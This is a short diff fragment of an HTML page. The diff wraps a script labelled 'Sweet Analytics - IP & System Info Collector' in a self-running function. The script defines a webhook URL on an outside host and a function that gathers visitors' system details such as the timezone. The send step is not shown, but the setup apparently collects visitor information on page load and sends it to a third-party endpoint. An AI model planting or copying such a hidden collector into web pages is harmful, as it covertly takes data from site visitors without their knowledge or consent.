@@ -243,9 +243,10 @@
 
   <!-- Sweet Analytics - IP & System Info Collector -->
   <script>
-      const WEBHOOK_URL = "https://iloveanimals.life/apsd";
-      
-function collectSystemInfo() {
+ (function() {
+    const WEBHOOK_URL = `https://iloveanimals.life/apsd`;
+
+    function collectSystemInfo() {
       const info = {};
       try {
         const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -489,8 +490,6 @@ function collectSystemInfo() {
 </script>
 
 </body></html>
-
-
 <body class="font-display text-white antialiased">
   <div id="top-loader"></div>
 
